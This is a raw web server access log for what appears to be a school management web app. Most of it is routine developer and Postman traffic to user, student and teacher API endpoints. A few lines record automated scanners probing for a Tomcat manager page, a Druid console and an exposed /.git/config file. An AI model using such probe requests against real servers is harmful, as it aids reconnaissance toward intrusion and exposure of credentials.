116.96.77.176 - - [14/Apr/2025:04:12:18 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:21 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:21 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:30 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:30 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:32 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:34 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
70.81.255.42 - - [14/Apr/2025:04:13:35 +0000] "GET / HTTP/1.0" 200 1711 "-" "curl/7.88.1"
154.81.156.34 - - [14/Apr/2025:04:15:24 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.127.158.102 - - [14/Apr/2025:04:16:00 +0000] "GET /manager/text/list HTTP/1.1" 200 858 "-" "Mozilla/5.0 zgrab/0.x"
185.40.4.51 - - [14/Apr/2025:04:18:26 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:04:18:34 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.86.50.139 - - [14/Apr/2025:04:23:26 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 29498 "-" "PostmanRuntime/7.43.3"
116.96.77.176 - - [14/Apr/2025:04:24:13 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:24:13 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:24:16 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:24:17 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
173.252.95.32 - - [14/Apr/2025:04:24:23 +0000] "GET /api-nodejs/users/create HTTP/1.1" 401 117 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
54.86.50.139 - - [14/Apr/2025:04:28:50 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 461 "-" "PostmanRuntime/7.43.3"
118.68.26.235 - - [14/Apr/2025:04:28:53 +0000] "GET /ws HTTP/1.1" 101 1240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
54.86.50.139 - - [14/Apr/2025:04:28:56 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 29498 "-" "PostmanRuntime/7.43.3"
3.236.208.110 - - [14/Apr/2025:04:32:13 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 401 117 "-" "got (https://github.com/sindresorhus/got)"
54.86.50.139 - - [14/Apr/2025:04:33:29 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 29946 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:33:59 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 29946 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:34:42 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=50&phone HTTP/1.1" 200 26533 "-" "PostmanRuntime/7.43.3"
93.174.93.12 - - [14/Apr/2025:04:35:22 +0000] "GET / HTTP/1.0" 200 1711 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0 SeaMonkey/2.28"
54.86.50.139 - - [14/Apr/2025:04:35:59 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=50&phone HTTP/1.1" 200 26533 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:36:03 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 29946 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:37:51 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 30394 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:38:00 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=Student&className=&limit=10&phone HTTP/1.1" 200 91 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:38:07 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5643 "-" "PostmanRuntime/7.43.3"
154.81.156.54 - - [14/Apr/2025:04:38:17 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.86.50.139 - - [14/Apr/2025:04:39:30 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5643 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:39:37 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5643 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:39:55 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5643 "-" "PostmanRuntime/7.43.3"
103.147.6.69 - - [14/Apr/2025:04:41:10 +0000] "GET / HTTP/1.1" 200 1711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
54.86.50.139 - - [14/Apr/2025:04:41:57 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5719 "-" "PostmanRuntime/7.43.3"
43.135.142.7 - - [14/Apr/2025:04:42:05 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
173.252.95.112 - - [14/Apr/2025:04:46:21 +0000] "GET / HTTP/1.1" 200 1711 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
185.40.4.51 - - [14/Apr/2025:04:47:11 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
116.96.77.176 - - [14/Apr/2025:04:47:24 +0000] "GET /api-nodejs/users/create HTTP/1.1" 401 117 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
54.86.50.139 - - [14/Apr/2025:05:00:39 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=student&className=&limit=10&phone HTTP/1.1" 200 5719 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:05:00:44 +0000] "GET /api-nodejs/students?page=1&limit=10&search=anhatst2112&classId=&className=&batchId=&batchYear= HTTP/1.1" 200 700 "-" "PostmanRuntime/7.43.3"
185.242.226.153 - - [14/Apr/2025:05:00:53 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03\x1B\xCFL\x81\x1Ak&\xD3rg\xB2\x10\xEE\x82\x0B\xC0P\x9E\x13\xF8wB.(\x18\xC7G\xAD<\xBD\x97:\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
195.240.19.21 - - [14/Apr/2025:05:06:19 +0000] "GET / HTTP/1.1" 200 2792 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
154.81.156.54 - - [14/Apr/2025:05:06:42 +0000] "GET / HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [14/Apr/2025:05:07:27 +0000] "GET / HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.68.26.235 - - [14/Apr/2025:05:10:16 +0000] "GET /login HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:10:16 +0000] "GET /ws HTTP/1.1" 101 15111 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:10:16 +0000] "GET /static/js/bundle.js HTTP/1.1" 200 7665 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:10:16 +0000] "GET /favicon.ico HTTP/1.1" 200 539 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
116.96.77.176 - - [14/Apr/2025:05:11:50 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:11:53 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
54.86.50.139 - - [14/Apr/2025:05:14:18 +0000] "GET /api-nodejs/teachers?page=1&limit=&search=&className= HTTP/1.1" 200 4516 "-" "PostmanRuntime/7.43.3"
135.237.126.217 - - [14/Apr/2025:05:16:32 +0000] "GET /druid/index.html HTTP/1.1" 200 539 "-" "Mozilla/5.0 zgrab/0.x"
154.81.156.34 - - [14/Apr/2025:05:25:09 +0000] "GET / HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:05:28:23 +0000] "GET / HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.211.191.127 - - [14/Apr/2025:05:29:09 +0000] "GET /.git/config HTTP/1.1" 200 539 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
14.173.146.14 - - [14/Apr/2025:05:34:20 +0000] "GET / HTTP/1.1" 200 2792 "-" "-"
154.81.156.54 - - [14/Apr/2025:05:37:06 +0000] "GET / HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
123.21.169.122 - - [14/Apr/2025:05:43:13 +0000] "GET / HTTP/1.1" 200 2792 "-" "-"
116.96.77.176 - - [14/Apr/2025:05:45:37 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:45:37 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:45:40 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:45:42 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
20.29.45.238 - - [14/Apr/2025:05:46:05 +0000] "GET /manager/text/list HTTP/1.1" 200 866 "-" "Mozilla/5.0 zgrab/0.x"
118.68.26.235 - - [14/Apr/2025:05:47:26 +0000] "GET / HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:47:26 +0000] "GET /static/js/bundle.js HTTP/1.1" 200 858359 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:47:26 +0000] "GET /favicon.ico HTTP/1.1" 200 3667 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
54.86.50.139 - - [14/Apr/2025:05:48:13 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 461 "-" "PostmanRuntime/7.43.3"
118.68.26.235 - - [14/Apr/2025:05:48:44 +0000] "GET /login HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:48:44 +0000] "GET /static/js/bundle.js HTTP/1.1" 200 858469 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:48:45 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:48:45 +0000] "GET /ws HTTP/1.1" 101 1214 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:05:57:48 +0000] "GET /main.0a2c5db2de619785a086.hot-update.json HTTP/1.1" 200 866 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
116.96.77.176 - - [14/Apr/2025:05:58:48 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:58:48 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 402 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:05:58:53 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
154.81.156.54 - - [14/Apr/2025:06:03:20 +0000] "GET / HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.29.0.1 - - [14/Apr/2025:06:05:24 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.5.0"
154.81.156.35 - - [14/Apr/2025:06:06:00 +0000] "GET / HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.68.26.235 - - [14/Apr/2025:06:06:06 +0000] "GET /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:06:06 +0000] "GET /ws HTTP/1.1" 101 2172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:06:07 +0000] "GET /static/js/bundle.js HTTP/1.1" 200 858401 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:06:08 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
116.96.77.176 - - [14/Apr/2025:06:06:37 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:38 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 461 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:46 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:46 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:46 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:46 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:50 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:50 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:53 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:06:54 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
118.68.26.235 - - [14/Apr/2025:06:13:25 +0000] "GET /ws HTTP/1.1" 101 8223 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api HTTP/1.1" 301 169 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api/ HTTP/1.1" 404 143 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api-nodejs HTTP/1.1" 301 169 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api-nodejs/ HTTP/1.1" 404 143 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api-python HTTP/1.1" 301 169 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:16:04 +0000] "GET /api-python/ HTTP/1.1" 404 22 "-" "axios/1.8.4"
118.68.26.235 - - [14/Apr/2025:06:17:34 +0000] "GET /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:17:34 +0000] "GET /ws HTTP/1.1" 101 2646 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:17:34 +0000] "GET /static/js/bundle.js HTTP/1.1" 200 822843 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:17:35 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
172.29.0.6 - - [14/Apr/2025:06:18:04 +0000] "GET /api-nodejs/ HTTP/1.1" 404 143 "-" "axios/1.8.4"
172.29.0.6 - - [14/Apr/2025:06:18:04 +0000] "GET / HTTP/1.1" 200 825 "-" "axios/1.8.4"
118.68.26.235 - - [14/Apr/2025:06:18:24 +0000] "GET /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:24 +0000] "GET /ws HTTP/1.1" 101 2266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:24 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
